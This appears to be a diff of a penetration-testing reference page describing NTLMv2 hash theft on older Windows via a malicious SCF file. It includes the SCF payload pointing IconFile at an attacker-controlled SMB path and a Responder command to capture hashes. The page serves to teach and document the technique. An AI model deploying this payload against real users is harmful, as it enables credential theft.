@@ -31,23 +31,41 @@ Windows versions prior to 10 are vulnerable to NTLMv2 hash stealing using SMB an
 
 Windows versions prior to 10 are vulnerable to NTLMv2 hash stealing using SMB and SCF files, disclosing password hashes without the user explicitly selecting the SCF file. Vulnerable versions of Windows will automatically load SCF files found in a folder, which can load files on remote systems using protocols like SMB. When the system attempts to authenticate with the remote SMB, it discloses the user's NTLMv2 password hash, which can be intercepted using tools like Responder. This procedure details stealing a hash by uploading the SCF file to an SMB and waiting for a vulnerable user to browse to it, but the same  technique works by simply placing the SCF file on the target's machine.
 
+
+
 # Instructions
 
 1. Create the SCF file, specifying the external server using the IconFile field. The name of the file itself which IconFile points to does not matter.
+
+
+
+
 
 **Code**: [[[Shell]
 Command=2
 IconFile=\\$_ATTACKER_IP\files\p]]
 
+
+
+
+
 2. Upload the SCF file to a location that the target will browse, such as an SMB server.
 
 3. Launch a listener to intercept the target's hash.
+
+
+
+
 
 **Command** ([[Responder Intercept an NTLM Hash]]):
 
 ```bash
 responder -I $_INTERFACE
 ```
+
+
+
+
 
 ## Platforms
 
@@ -71,3 +89,5 @@ responder -I $_INTERFACE
 
 - [[Network]]
 - [[NTLM]]
+
+
